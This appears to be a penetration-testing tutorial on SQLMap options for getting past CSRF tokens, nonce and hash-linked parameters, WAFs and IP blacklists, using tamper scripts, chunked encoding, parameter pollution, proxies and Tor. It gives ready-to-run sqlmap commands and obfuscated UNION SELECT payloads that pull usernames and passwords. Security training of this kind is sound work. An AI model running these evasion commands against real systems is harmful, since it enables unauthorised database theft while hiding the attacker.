# Bypassing Web Application Protections

Real-world targets almost always have at least one protection layer between the scanner and the database. SQLMap has a layered bypass toolkit built specifically for each class of protection.

***

## Protection Types and Their Bypasses

### 1. Anti-CSRF Token Bypass

CSRF tokens are per-request values that expire after use, designed to prevent automated form submission. SQLMap handles them by re-fetching a fresh token from the page before each request:

```bash
sqlmap -u "http://target.com/" \
  --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" \
  --csrf-token="csrf-token" --batch
```

SQLMap also auto-detects parameters containing common infixes (`csrf`, `xsrf`, `token`) and prompts to update them automatically without needing `--csrf-token` explicitly.

### 2. Unique Value Bypass

Some applications require a unique parameter value per request without requiring server-side token validation. `--randomize` generates a fresh random value for the specified parameter on every request:

```bash
sqlmap -u "http://target.com/?id=1&rp=29125" --randomize=rp --batch
```

Each request gets a different `rp` value, satisfying the uniqueness requirement while SQLMap still injects into `id`.

### 3. Calculated Parameter Bypass

When one parameter must contain a hash of another (e.g., `h=MD5(id)`), `--eval` runs Python code before each request to recalculate the dependent parameter:

```bash
sqlmap -u "http://target.com/?id=1&h=c4ca4238a0b923820dcc509a6f75849b" \
  --eval="import hashlib; h=hashlib.md5(id).hexdigest()" --batch
```

As SQLMap mutates the `id` value for each payload, `--eval` recalculates and updates `h` to match, keeping the request valid. This works for any computable relationship between parameters, not just MD5: SHA1, HMAC, base64, or custom transformations are all achievable in the eval expression.

***

## WAF Detection and Bypass

SQLMap sends a deliberately malicious probe to a non-existent parameter at the start of every scan to check for WAF presence. A 406 or unusual response indicates ModSecurity or similar. The tool then uses the `identYwaf` library to fingerprint which of 80 known WAF solutions is present.

```bash
# Skip WAF detection entirely (less noise, faster startup)
sqlmap -u "http://target.com/?id=1" --skip-waf --batch
```

***

## IP Address Concealment

```bash
# Single proxy
sqlmap -u "http://target.com/?id=1" --proxy="socks4://177.39.187.70:33283"

# Rotate through a proxy list automatically
sqlmap -u "http://target.com/?id=1" --proxy-file=/tmp/proxies.txt

# Route through Tor (requires Tor running locally on port 9050)
sqlmap -u "http://target.com/?id=1" --tor --tor-type=SOCKS5

# Verify Tor is working before scanning
sqlmap -u "http://target.com/?id=1" --tor --check-tor
```

`--check-tor` connects to `https://check.torproject.org/` and verifies the Congratulations message appears before proceeding. If Tor is misconfigured and traffic is leaking through the real IP, the check fails and SQLMap stops rather than exposing the source address.

***

## Tamper Scripts

Tamper scripts modify payload content just before transmission, transforming recognisable SQL keywords and operators into forms that bypass WAF signature matching while remaining syntactically valid to the database.

```bash
# Single tamper script
sqlmap -u "http://target.com/?id=1" --tamper=between --batch

# Chained tamper scripts (applied in priority order)
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment --batch

# List all available tamper scripts with descriptions
sqlmap --list-tampers
```

### Key Tamper Scripts by Use Case

| Use Case | Tamper Script | Transformation |
|----------|--------------|---------------|
| Bypass XSS-focused WAFs | `between` | `>` to `NOT BETWEEN 0 AND #`, `=` to `BETWEEN # AND #` |
| Evade keyword detection | `randomcase` | `SELECT` to `SeLeCt` |
| Evade space detection | `space2comment` | spaces to `/**/` |
| Evade space detection | `space2hash` | spaces to `#random\n` (MySQL) |
| Encode entire payload | `base64encode` | full base64 encoding |
| ModSecurity bypass | `modsecurityversioned` | wraps query in MySQL versioned comment |
| Keyword obfuscation | `versionedkeywords` | wraps each keyword in `/*!keyword*/` |
| MSSQL space bypass | `space2mssqlblank` | spaces to random valid blank characters |

### Tamper Script Chaining Strategy

A practical chain for MySQL targets behind a generic WAF:

```bash
--tamper=between,randomcase,space2comment,versionedkeywords
```

This transforms a payload like:
```sql
AND 1=1 UNION SELECT username FROM users
```
Into something like:
```sql
AND 1 BETWEEN 1 AND 1 /*!uNiOn*/ /*!SeLeCt*/ username/**/FROM/**/users
```

Scripts are applied in predefined priority order, not necessarily the order you list them. Scripts that modify SQL syntax run before scripts that modify formatting, preventing conflicts.

***

## Miscellaneous Bypasses

### Chunked Transfer Encoding

```bash
sqlmap -u "http://target.com/" --data="id=1" --chunked --batch
```

Splits the POST body into HTTP chunks, distributing blacklisted SQL keywords across chunk boundaries so no single chunk contains a complete blocked string.

### HTTP Parameter Pollution (HPP)

```bash
# SQLMap handles this automatically when --hpp is used
sqlmap -u "http://target.com/?id=1" --hpp --batch
```

Splits payloads across repeated parameter names:

```
?id=1&id=UNION&id=SELECT&id=username,password&id=FROM&id=users
```

Platforms like ASP and ASP.NET concatenate duplicate parameter values server-side, reassembling the full payload after it passes WAF inspection. Each fragment appears harmless in isolation.

***

## Bypass Selection Guide

```
HTTP 5XX errors immediately → --random-agent (User-Agent blacklisted)
CSRF token in form data    → --csrf-token="token_param_name"
Unique nonce parameter     → --randomize=nonce_param
Hash-linked parameters     → --eval="python expression"
WAF blocking payloads      → --tamper=between,randomcase,space2comment
IP blacklisted             → --proxy or --tor
WAF detection noisy        → --skip-waf
POST body filtering        → --chunked or --hpp
```
